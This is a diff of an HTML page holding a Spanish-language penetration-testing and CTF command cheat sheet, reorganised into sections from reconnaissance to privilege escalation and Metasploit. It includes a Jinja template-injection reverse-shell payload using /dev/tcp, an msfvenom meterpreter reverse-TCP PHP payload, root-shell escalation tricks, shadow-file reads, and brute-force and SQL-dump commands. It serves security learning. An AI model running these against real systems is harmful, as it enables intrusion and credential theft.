@@ -10,73 +10,40 @@
 <body>
     <h1>Comandos</h1>
    <pre> <code>
-find / -perm -4000 2>/dev/null [busca en todo el sistema archivos con privilegios elevados]
+1. reconocimiento e informacion:
 
-find / -perm -u=s -type f 2>/dev/null [busca archivos en todo el sistema que tienen el bit setuid activado, lo que significa que cuando se ejecutan lo hacen con los privilegios del propietario]
-
-/sbin/getcap -r / 2>/dev/null [busca todos los archivos del sistema que tengan Linux capabilities asignadas, ocultando los errores de acceso]
-
-ps -eaf [muestra una lista detallada de los procesos del sistema]
-
-ltrace ./archivo [muestra en tiempo real las funciones de biblioteca que un programa llama mientras se ejecuta]
-
-nc -zv ip (puerto) [verifica si un puerto está abierto en un host]
-
-nc ip (puerto) {contraseña} [conectar servidor a un puerto en específico]
-
-nc localhost (puerto) {contraseña} [conectar el servidor en el que estás a un puerto en específico]
-
-nc –lnvp (puerto) [creará un servidor de escucha, mostrará información sobre las conexiones y no intentará resolver los nombres de host de quienes se conecten. Estará esperando que alguien le envíe datos a ese puerto]
-
-ss -tnl [esto muestra la informacion de las conexiones activas en el servidor]
-
-ncat --ssl (servidor) (puerto) [sirve para crear una conexión más segura y con cifrado]
-
-ncat servidor (puerto) [sirve para crear conexiones de forma mucho más segura]
-
-sudo nmap -p- -sC -sV -T4 -Pn -sT -n -O -v (ip) -oN (infoDeNmap) [El comando realiza un escaneo completo de todos los puertos TCP de una ip, detectando servicios, versiones, sistema operativo y ejecutando scripts por defecto, guardando el resultado en un archivo de la informacion de todo el escaneo]
-
-ping página o ip [se usa para verificar la conectividad de red entre tu máquina y otra dirección]
-
-sudo ed [dentro de ed, al usar el comando !/bin/sh, ejecutamos una shell con permisos de root, lo que nos da control total sobre el sistema. Esto se aprovecha en la escalada de privilegios en un CTF para obtener acceso como administrador]
-
-sudo -l [muestra qué comandos puedes ejecutar con privilegios de superusuario]
-
-sudo -u (usuario) [permite ejecutar un comando con los permisos de un usuario diferente, lo cual es útil cuando necesitas ejecutar tareas con los privilegios de otro usuario sin dar acceso completo como root]
-
-sudo -u (usuario) /usr/bin/python /direccion/exploit.py [ejecuta exploit.py como USUARIO utilizando la versión de Python especificada en la ruta]
-
-sudo bash [permite ejecutar una bash con privilegios de root]
-
-#!/bin/bash [le indica al sistema operativo qué intérprete usar para ejecutar el script]
-
-binwalk -e (archivo ) [escanea un archivo binario en busca de datos incrustados como archivos comprimidos o imágenes y los extrae automáticamente a una carpeta]
-
-strings (archivo) [extrae las cadenas de texto de un archivo]
-
-printenv (variable) [sirve para mostrar variables de entorno del sistema]
-
-python3 -c 'import pty;pty.spawn("/bin/bash");' [para invocar una shell si esta python3 instalado]
-
-{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/IP/PUERTO 0>&1"')}} [si se codifica en url puede actuar como shell reversa disfrazado con plantilla de tipo Jinja] 
 
 ip a [linux] / ipconfig [windows] [averiguar ip de nuestro dispositivo]
 
 ping (ip) [para ver si hay conexión con una ip]
 
-ncat -lvnp (puerto) [sirve para escuchar conexiones entrantes a un puerto, actuando como un servidor a la espera de que un cliente se conecte]
+ping página o ip [se usa para verificar la conectividad de red entre tu máquina y otra dirección]
 
-nmap (ip)/24 [escanea todos los hosts en la red para detectar puertos abiertos y servicios activos]
+dig (dominio.com) @(ip) [hace una consulta DNS al servidor de nombres especificado por ip, preguntando por los registros del dominio]
 
-nmap -p (puerto) -sCV (ip) -oN (archivo.txt) [escanea un puerto específico de una ip para detectar servicios, versiones y posibles vulnerabilidades, y guarda el resultado en un archivo de texto]
+
+
+
+2. escaneo y enumeracion:
+
+
+sudo nmap -p- -sC -sV -T4 -Pn -sT -n -O -v (ip) -oN (infoDeNmap) [El comando realiza un escaneo completo de todos los puertos TCP de una ip, detectando servicios, versiones, sistema operativo y ejecutando scripts por defecto, guardando el resultado en un archivo de la informacion de todo el escaneo]
 
 whatweb (ip) [sirve para identificar tecnologías y servicios usados por un sitio web]
+
+enum4linux (IP) [enumera usuarios, grupos, recursos compartidos SMB, políticas y más en sistemas Windows/Samba]
 
 wpscan --url (ip) [es para identificar plugin o cosas vulnerables en un sitio WordPress]
 
 wpscan --url (ip) --enumerate u [sirve para enumerar los usuarios registrados en un sitio wordpress en busca de posibles vectores de ataque como fuerza bruta]
 
 wpscan --url (ip) -e u --ignore-main-redirect --force [obtiene usuarios de WordPress sin detenerse por redirecciones ni errores]
+
+
+
+
+3. fuzzing y fuerza rutas web:
+
 
 gobuster dir -u http://IP/ -w (RutaDeWordlist) -x html,php,txt,zip -t 100 -k -r [Fuerza rutas ocultas en un sitio web usando una wordlist, probando extensiones .html, .php, .txt y .zip con 100 hilos, ignorando certificados y sin seguir redirecciones.]
 
@@ -90,11 +57,23 @@ dirbuster [programa con interfaz grafica que fuerza rutas ocultas en un sitio we
 
 wfuzz -u 'http://pagina/archivo.php?FUZZ=/etc/passwd' -w /ruta/wordlist -t 5 [fuerza una posible ruta oculta en donde esta FUZZ, que pueda ejecutar un comando, con -t 5 para no saturar la maquina y preferible usar una wordlist chica]
 
+
+
+
+4. explotacion web e inyeccion:
+
+
+curl -v -X OPTIONS (ip o url) [realiza una solicitud OPTIONS a un sitio web]
+
+curl -T archivo (ip/dir/archivo) --http1.0 [sirve para subir un archivo a un servidor web usando el método HTTP PUT bajo la versión HTTP/1.0]
+
 sqlmap -r (archivo.sql) --dbs [ejecuta un ataque de inyección SQL usando una petición HTTP guardada en el archivo archivo.sql para detectar y listar las bases de datos del servidor objetivo]
 
 sqlmap -r (archivo.sql) -D (USUARIOS) --dump-all [extrae y muestra todo el contenido de todas las tablas dentro de la base de datos llamada por ejemplo USUARIOS, usando la petición HTTP del archivo archivo.sql]
 
 sqlmap -u (usuario) -h (ip) -p [El comando usa sqlmap para probar si un parámetro de la URL (especificado con -p) es vulnerable a inyección SQL en un sitio web (indicado con -u)]
+
+{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/IP/PUERTO 0>&1"')}} [si se codifica en url puede actuar como shell reversa disfrazado con plantilla de tipo Jinja] 
 
 mysql -u (usuario) -h (ip) -p --skip-ssl (sirve para conectarse a una base de datos mysql a traves de un usuario, ip y contraseña intentando evadir la verificacion ssl)
 
@@ -106,13 +85,13 @@ use (BaseDeDatos); [en mysql selecciona una base de datos]
 
 select * from (tabla); [en mysql esto lista toda la tabla de una base de datos]
 
-curl -v -X OPTIONS (ip o url) [realiza una solicitud OPTIONS a un sitio web]
+searchsploit (nombre del exploit) [busca posibles exploits]
 
-curl -T archivo (ip/dir/archivo) --http1.0 [sirve para subir un archivo a un servidor web usando el método HTTP PUT bajo la versión HTTP/1.0]
 
-enum4linux (IP) [enumera usuarios, grupos, recursos compartidos SMB, políticas y más en sistemas Windows/Samba]
 
-dig (dominio.com) @(ip) [hace una consulta DNS al servidor de nombres especificado por ip, preguntando por los registros del dominio]
+
+5. fuerza bruta, codificacion, y wordlists:
+
 
 zip2john archivo.zip > otroarchivo.zip [extrae el hash de la contraseña del archivo ZIP para que pueda ser crackeado por John the Ripper]
 
@@ -124,13 +103,47 @@ john --format=sha512crypt --wordlist=(RutaDeWordlist) --pot=contraseñasdesifrad
 
 hashcat --force (contraseña) -r /usr/share/hashcat/rules/best64.rule --stdout > variaciones.txt [genera variaciones posibles de la contraseña aplicando las reglas del archivo best64.rule y muestra las combinaciones en variaciones.txt]
 
-hydra -L (usuario) -P (RutaDeWordlist) ssh://IP [realiza un ataque de fuerza bruta al servicio SSH usando el usuario "admin" y la wordlist "rockyou.txt" para intentar encontrar la contraseña]
+hydra -L (usuario) -P (RutaDeWordlist) ssh://IP [realiza un ataque de fuerza bruta al servicio SSH usando un usuario y una wordlist para intentar encontrar la contraseña]
 
-stegcracker (archivo de imagen) (RutaDeWordlist) [analiza imágenes y busca posibles mensajes o archivos escondidos dentro de ellas]
+base64 [codificar base64]
 
-script /dev/null -c bash [sirve para convertir una shell limitada en una terminal interactiva completa que soporte comandos, flechas y autocompletado]
+echo “palabra” | base64 [codificar base64]
 
-uname -r [muestra la versión del kernel de Linux que está corriendo en el sistema]
+base64 -d archivo < archivo1 [decodificar base 64]
+
+for i in $(cat RutaDelWorlist); do echo $i | md5sum >> resultado.txt; done [lee cada línea de un archivo de palabras y guarda en resultado.txt el hash MD5 de cada una, siempre comprobar que no hayan espacios vacios o caracteres de más]
+
+xxd archivo.txt [transforma binario a hexadecimal]
+
+xxd -r archivo.txt [transforma hexadecimal a binario]
+
+mp64 (contraseña) >> wordlist [genera varias posibilidades de contraseñas con los siguientes caracteres:   
+                              ?l = abcdefghijklmnopqrstuvwxyz 
+                              ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ 
+                              ?d = 0123456789 
+                              ?s =  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ 
+                              ?a = ?l?u?d?s
+                              ?b = 0x00 - 0xff ]
+
+
+
+
+6. conexiones y transferencia de archivos:
+
+
+nc -lvnp (puerto) [sirve para escuchar conexiones entrantes a un puerto, actuando como un servidor a la espera de que un cliente se conecte]
+
+nc -zv ip (puerto) [verifica si un puerto está abierto en un host]
+
+nc ip (puerto) {contraseña} [conectar servidor a un puerto en específico]
+
+nc localhost (puerto) {contraseña} [conectar el servidor en el que estás a un puerto en específico]
+
+ss -tnl [esto muestra la informacion de las conexiones activas en el servidor]
+
+ncat --ssl (servidor) (puerto) [sirve para crear una conexión más segura y con cifrado]
+
+ncat servidor (puerto) [sirve para crear conexiones de forma mucho más segura]
 
 python3 -m http.server (puerto) [levanta un servidor web simple en un puerto para compartir archivos de forma rápida desde el directorio donde lo ejecutás]
 
@@ -138,13 +151,94 @@ wget http://ip:puerto/archivo [usando wget podes traer de una maquina, un archiv
 
 wget -r SERVICIO://ip/archivo [usando wget con el parametro -r, se puede traer archivos de un servicio especifico de la maquina, por ejemplo ftp]
 
-gcc -pthread (archivo.c) -o (nombre del archivo a compilar) -lcrypt [compila un programa en C que aprovecha una vulnerabilidad para crear un usuario con permisos de administrador]
+ssh usuario@servidor -p puerto [iniciar sesión]
 
-rlogin -l root (ip) [intenta iniciar una sesión remota en otro sistema utilizando el usuario root]
+sftp usuario@servidor [SFTP es un subsistema dentro del servicio SSH, cuando configuras SSH en un servidor, generalmente por defecto permite la transferencia segura de archivos]
 
 smbclient //ip/nombreServidor -U (usuario) [permite acceder a recursos compartidos en servidores que usan el protocolo SMB se puede navegar por directorios, descargar y subir archivos entre tu máquina y un servidor remoto]
 
-searchsploit (nombre del exploit) [busca posibles exploits]
+rlogin -l root (ip) [intenta iniciar una sesión remota en otro sistema utilizando el usuario root]
+
+ssh -i /ruta/a/tu/clave_privada user@hostname [para conectarte a un servidor remoto usando tu clave privada SSH]
+
+ssh usuario@servidor -p puerto “comando” [inicia sesión y ejecuta un comando sin quedarse conectado]
+
+ssh-keygen [para generar una clave]
+
+ssh-keygen -lf [sirve para mostrar la huella digital de una clave SSH pública]
+
+ssh-keygen -t ed25519 -C "tu_email@example.com" [para generar una clave ssh con un mail]
+
+cat ~/.ssh/clave.pub [para leer la clave ssh]
+
+ssh -T git@github.com [probar conexion en git con ssh para autenticar]
+
+systemctl enable ssh [iniciar ssh]
+
+openssl s_client -connect gugul.com:puerto [para trabajar con protocolos de seguridad, certificados, y cifrado, también puede realizar pruebas de SSL/TLS]
+
+openssl s_client -connect localhost:puerto [para conectarse estando dentro del servidor en un puerto específico]
+
+ftp (ip) [es un protocolo de transferencia de archivos que permite a los usuarios subir y descargar archivos de manera remota entre computadoras a través de una red]
+
+
+
+
+7. compilacion, analisis de archivos y binarios:
+
+gcc -pthread (archivo.c) -o (nombre del archivo a compilar) -lcrypt [compila un programa en C que aprovecha una vulnerabilidad para crear un usuario con permisos de administrador]
+
+binwalk -e (archivo ) [escanea un archivo binario en busca de datos incrustados como archivos comprimidos o imágenes y los extrae automáticamente a una carpeta]
+
+strings (archivo) [extrae las cadenas de texto de un archivo]
+
+stegcracker (archivo de imagen) (RutaDeWordlist) [analiza imágenes y busca posibles mensajes o archivos escondidos dentro de ellas]
+
+
+
+
+8. post explotacion y escalada de privilegios:
+
+
+find / -perm -4000 2>/dev/null [busca en todo el sistema archivos con privilegios elevados]
+
+find / -perm -u=s -type f 2>/dev/null [busca archivos en todo el sistema que tienen el bit setuid activado, lo que significa que cuando se ejecutan lo hacen con los privilegios del propietario]
+
+/sbin/getcap -r / 2>/dev/null [busca todos los archivos del sistema que tengan Linux capabilities asignadas, ocultando los errores de acceso]
+
+find -name "archivo" 2>/dev/null [/ indica que busque en la raíz del sistema. -name “archivo” indica busca archivos o carpetas que literal se llamen “archivo”. 2>/dev/null oculta los problemas]
+
+ps -eaf [muestra una lista detallada de los procesos del sistema]
+
+ltrace ./archivo [muestra en tiempo real las funciones de biblioteca que un programa llama mientras se ejecuta]
+
+sudo -l [muestra qué comandos puedes ejecutar con privilegios de superusuario]
+
+sudo -u (usuario) [permite ejecutar un comando con los permisos de un usuario diferente, lo cual es útil cuando necesitas ejecutar tareas con los privilegios de otro usuario sin dar acceso completo como root]
+
+sudo -u (usuario) /usr/bin/python /direccion/exploit.py [ejecuta exploit.py como USUARIO utilizando la versión de Python especificada en la ruta]
+
+#!/bin/bash [le indica al sistema operativo qué intérprete usar para ejecutar el script]
+
+python3 -c 'import pty;pty.spawn("/bin/bash");' [para invocar una shell si esta python3 instalado]
+
+printenv (variable) [sirve para mostrar variables de entorno del sistema]
+
+uname -r [muestra la versión del kernel de Linux que está corriendo en el sistema]
+
+chmod 400 [solo el propietario puede leer el archivo]
+
+chmod 600 [solo el propietario puede leer y escribir el archivo]
+
+chmod 777 [abrir permisos para todos los usuarios, leer, escribir y ejecutar]
+
+chmod +x [da permisos para ejecutar un archivo]
+
+
+
+
+9. metasploit y payloads:
+
 
 msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip) LPORT=(puerto) -f raw > archivo.php [crea un archivo PHP malicioso que al subirlo se conecta a tu IP y puerto para darte control remoto del sistema]
 
@@ -172,6 +266,29 @@ back [para salir del modulo y volver a la consola]
 
 exit [para salir de la consola de metasploit]
 
+
+exploit/unix/webapp/wp_admin_shell_upload [WordPress Admin Shell Upload]
+
+exploit/unix/ftp/proftpd_133c_backdoor [ProFTPD-1.3.3c Backdoor Command Execution]
+
+auxiliary/admin/http/wp_google_maps_sqli [WordPress Google Maps Plugin SQL Injection]
+
+exploit/multi/handler [Generic Payload Handler] {
+
+  payload/php/meterpreter_reverse_tcp
+
+}
+
+scanner/http/tomcat_mgr_login [Tomcat Application Manager Login Utility]
+
+exploit/multi/http/builderengine_upload_exec [BuilderEngine 3.5.0 Arbitrary File Upload Vulnerability and execution]
+
+
+
+
+10. otros:
+
+
 getent passw [información de usuarios]
 
 getent shadow [información de contraseñas de usuarios]
@@ -187,14 +304,6 @@ cat ./directorio [para buscar los archivos de texto]
 cd .. [te devuelve para atrás]
 
 cd directorio/ [entra a un directorio]
-
-chmod 400 [solo el propietario puede leer el archivo]
-
-chmod 600 [solo el propietario puede leer y escribir el archivo]
-
-chmod 777 [abrir permisos para todos los usuarios, leer, escribir y ejecutar]
-
-chmod +x [da permisos para ejecutar un archivo]
 
 cp /directorio/archivo.txt [copia un archivo a otro directorio]
 
@@ -258,46 +367,6 @@ tar -cf archivo.tar carpeta/ [crea un archivo .tar empaquetando una carpeta]
 
 tar -xf archivo.tar [extrae el contenido del archivo .tar]
 
-xxd archivo.txt [transforma binario a hexadecimal]
-
-xxd -r archivo.txt [transforma hexadecimal a binario]
-
-ping página o ip [se usa para verificar la conectividad de red entre tu máquina y otra dirección]
-
-ssh usuario@servidor -p puerto [iniciar sesión]
-
-sftp usuario@servidor [SFTP es un subsistema dentro del servicio SSH, cuando configuras SSH en un servidor, generalmente por defecto permite la transferencia segura de archivos]
-
-ssh -i /ruta/a/tu/clave_privada user@hostname [para conectarte a un servidor remoto usando tu clave privada SSH]
-
-ssh usuario@servidor -p puerto “comando” [inicia sesión y ejecuta un comando sin quedarse conectado]
-
-ssh-keygen [para generar una clave]
-
-ssh-keygen -lf [sirve para mostrar la huella digital de una clave SSH pública]
-
-ssh-keygen -t ed25519 -C "tu_email@example.com" [para generar una clave ssh con un mail]
-
-cat ~/.ssh/clave.pub [para leer la clave ssh]
-
-ssh -T git@github.com [probar conexion en git con ssh para autenticar]
-
-systemctl enable ssh [iniciar ssh]
-
-openssl s_client -connect gugul.com:puerto [para trabajar con protocolos de seguridad, certificados, y cifrado, también puede realizar pruebas de SSL/TLS]
-
-openssl s_client -connect localhost:puerto [para conectarse estando dentro del servidor en un puerto específico]
-
-ftp (ip) [es un protocolo de transferencia de archivos que permite a los usuarios subir y descargar archivos de manera remota entre computadoras a través de una red]
-
-base64 [codificar base64]
-
-base64 -d archivo < archivo1 [decodificar base 64]
-
-for i in $(cat RutaDelWorlist); do echo $i | md5sum >> resultado.txt; done [lee cada línea de un archivo de palabras y guarda en resultado.txt el hash MD5 de cada una, siempre comprobar que no hayan espacios vacios o caracteres de más]
-
-echo “palabra” | base64 [codificar base64]
-
 grep [para encontrar líneas de texto]
 
 ROT13 [usa las letras en el orden alfabético N-Z y A-M]
@@ -313,6 +382,18 @@ tr ‘a-z’ ‘A-Z’ [transforma minúsculas a mayúsculas]
 uniq -u [filtra líneas idénticas y -u elimina las repetidas]
 
 | [separa para colocar otro comando en la misma línea]
+
+<<< [Sirve para proporcionar una cadena de texto directamente como entrada estándar a un comando]
+
+& [Sirve para ejecutar comandos en segundo plano que son de larga duración como nc para conexiones largas, find para buscar en un directorio grande, cp para copiar archivos grandes]
+
+jobs [ver procesos en segundo plano]
+
+
+
+
+11. comandos de git:
+
 
 git init [Inicializa un nuevo repositorio Git]
 
@@ -393,29 +474,5 @@ git show <nombre_del_tag> [Muestra los detalles y el mensaje de un tag específi
 git push origin <nombre_del_tag> [Sube un tag específico a tu repositorio remoto]
 
 git push origin --tags [Sube todos tus tags locales a tu repositorio remoto]
-
-<<< [Sirve para proporcionar una cadena de texto directamente como entrada estándar a un comando]
-
-& [Sirve para ejecutar comandos en segundo plano que son de larga duración como nc para conexiones largas, find para buscar en un directorio grande, cp para copiar archivos grandes]
-
-jobs [ver procesos en segundo plano]
-    </code></pre>
-
-  <h1>Payloads Metasploit</h1>
-       
-   <pre> <code>
-exploit/unix/webapp/wp_admin_shell_upload [WordPress Admin Shell Upload]
-
-exploit/unix/ftp/proftpd_133c_backdoor [ProFTPD-1.3.3c Backdoor Command Execution]
-
-auxiliary/admin/http/wp_google_maps_sqli [WordPress Google Maps Plugin SQL Injection]
-
-exploit/multi/handler [Generic Payload Handler] {
-
-  payload/php/meterpreter_reverse_tcp
-
-}
-
-scanner/http/tomcat_mgr_login [Tomcat Application Manager Login Utility]
 
     </code></pre>
